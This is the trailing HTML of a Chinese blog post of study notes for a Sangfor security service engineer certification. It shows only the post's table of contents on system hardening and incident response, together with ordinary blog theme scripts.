href="#%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86-%E5%9F%BA%E7%BA%BF%E7%AE%A1%E7%90%86%E4%B8%8E%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E6%8F%90%E5%8D%87"><span class="toc-text">第一部分 基线管理与安全配置提升</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#6-1-1-%E5%9F%BA%E7%BA%BF%E7%AE%A1%E7%90%86%E6%A6%82%E8%BF%B0"><span class="toc-text">6.1.1 基线管理概述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-1-2-windows%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE"><span class="toc-text">6.1.2 windows安全配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-1-3-linux%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE"><span class="toc-text">6.1.3 linux安全配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-1-4-apache%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE"><span class="toc-text">6.1.4 apache安全配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-1-5-mariadb%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE"><span class="toc-text">6.1.5 mariadb安全配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-1-6-mongodb%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE"><span class="toc-text">6.1.6 mongodb安全配置</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86-%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%AE%A1%E7%90%86%E5%A4%84%E7%BD%AE"><span class="toc-text">第二部分 安全事件管理处置</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#6-2-1-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%AE%80%E4%BB%8B"><span class="toc-text">6.2.1 应急响应简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-2-2%E4%BA%8B%E4%BB%B6%E5%88%86%E7%BA%A7%E5%88%86%E7%B1%BB"><span class="toc-text">6.2.2事件分级分类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-2-3-%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%BD%AE%E6%80%9D%E8%B7%AF%E6%8C%87%E5%AF%BC"><span class="toc-text">6.2.3 安全事件处置思路指导</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-2-4-%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%BD%AE%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90"><span class="toc-text">6.2.4 安全事件处置案例分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-2-5-windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94"><span class="toc-text">6.2.5 windows应急响应</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-2-6-windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%B7%A5%E5%85%B7%E4%B8%8E%E6%97%A5%E5%BF%97"><span class="toc-text">6.2.6 windows应急响应工具与日志</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-2-7-linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94"><span class="toc-text">6.2.7 linux应急响应</span></a></li></ol></li></ol></li></ol></li></ol>
      
  </div>
</div>
</div>
        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="mX1@0" class="lazyload">
  <div class="sidebar-author-name">mX1@0</div>
  <div class="sidebar-description"></div>
</div>
<div class="sidebar-state">
  <div class="sidebar-state-article">
    <div>Post</div>
    <div class="sidebar-state-number">60</div>
  </div>
  <div class="sidebar-state-category">
    <div>Category</div>
    <div class="sidebar-state-number">26</div>
  </div>
  <div class="sidebar-state-tag">
    <div>Tag</div>
    <div class="sidebar-state-number">69</div>
  </div>
</div>
<div class="sidebar-social">
  
    <div class="icon-twitter sidebar-social-icon">
      <a href=https://x.com/0xMx1a0 itemprop="url" target="_blank" aria-label="twitter" rel="noopener external nofollow noreferrer"></a>
    </div>
  
</div>
<div class="sidebar-menu">
  
    
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
        <div class="sidebar-menu-icon icon rotate">
          
            &#xe62b;
          
        </div>
        <div class="sidebar-menu-link">首页</div>
      </div>
    
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归类"></a>
        <div class="sidebar-menu-icon icon rotate">
          
            &#xe62b;
          
        </div>
        <div class="sidebar-menu-link">归类</div>
      </div>
    
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
        <div class="sidebar-menu-icon icon rotate">
          
            &#xe62b;
          
        </div>
        <div class="sidebar-menu-link">关于</div>
      </div>
    
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
        <div class="sidebar-menu-icon icon rotate">
          
            &#xe62b;
          
        </div>
        <div class="sidebar-menu-link">友链</div>
      </div>
    
  
</div>
</div>
      
    
  </div>
  
    
      <div class="sidebar-btn-wrapper">
        <div class="sidebar-toc-btn current"></div>
        <div class="sidebar-common-btn"></div>
      </div>
    
  
</nav>

    </div>
    
    
    
    
<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>


<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>





<script src="/js/script.js"></script>



  
<script src="/js/aos.js"></script>

  <script>
    var aosInit = () => {
      AOS.init({
        duration: 1000,
        easing: "ease",
        once: true,
        offset: 50,
      });
    };
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', aosInit);
    } else {
      aosInit();
    }
  </script>



<script src="/js/pjax_script.js" data-pjax></script>







  
<script src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js" integrity="sha384-8LyaidD9GPxQQgLJO&#x2F;WRw&#x2F;O2h3BoNq&#x2F;ApI&#x2F;ecpvM6RsrCz2qP2ppBXUKihP4V&#x2F;2d" crossorigin="anonymous"></script>

  <script>
    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
  </script>










<div id="lazy-script">
  <div>
    
      
      
      <script data-pjax>
        window.REIMU_POST = {
          author: "mX1@0",
          title: "深信服安全服务认证工程师学习笔记",
          url: "http://example.com/2024/09/30/shen-xin-fu-an-quan-fu-wu-ren-zheng-gong-cheng-shi-xue-xi-bi-ji/",
          excerpt: "",
          description: "",
          stripContent: "深信服安全服务认证工程师学习笔记第一章 网络安全基础第一部分 网络安全基础第二部分 操作系统配置与应用第三部分 计算机网络原理与应用第二章 网络渗透测试基础第一部分 渗透测试概述2.1.1 渗透测试标准与流程渗透测试概述 渗透测试  ​  渗透测试(Penetration Testing)是一种通过模拟攻击的技术与方法，挫败目标系统的安全控制措施并获得控制访问权的安全测试方法。 ​  网络渗透测试主要依据CVE(Common Vulnerabilities and Exposures)已经发现的",
          date: "Mon Sep 30 2024 19:41:49 GMT+0800",
          updated: "Wed Aug 20 2025 23:37:27 GMT+0800",
          cover: "/images/%E7%8E%9B%E8%8E%8E%E6%8B%89%E8%92%82.jpg",
        };
      </script>
       
    
    
      
        
<script src="/js/insert_highlight.js" data-pjax></script>

        
      
    
    
      <script type="module" data-pjax>
        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
        
        const pswp = () => {
          if (_$$('.article-entry a.article-gallery-item').length > 0) {
            new PhotoSwipeLightbox({
              gallery: '.article-entry',
              children: 'a.article-gallery-item',
              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
            }).init();
          }
          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
            new PhotoSwipeLightbox({
              gallery: '.article-gallery',
              children: 'a.article-gallery-item',
              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
            }).init();
          }
          window.lightboxStatus = 'done';
          window.removeEventListener('lightbox:ready', pswp);
        }
        if(window.lightboxStatus === 'ready') {
          pswp()
        } else {
          window.addEventListener('lightbox:ready', pswp);
        }
      </script>
      
        








      
    
  </div>
</div>


  <script>
    console.log(String.raw`%c 
 ______     ______     __     __    __     __  __    
/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
 \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
                                                  
`,'color: #ff5252;')
    console.log('%c Theme.Reimu v' + '1.9.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
  </script>
  



  
<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>




<script>
  if ('serviceWorker' in navigator) {
    navigator.serviceWorker.getRegistrations().then((registrations) => {
      for (let registration of registrations) {
        registration.unregister();
      }
    });
  }
</script>









    
  </body>
  </html>

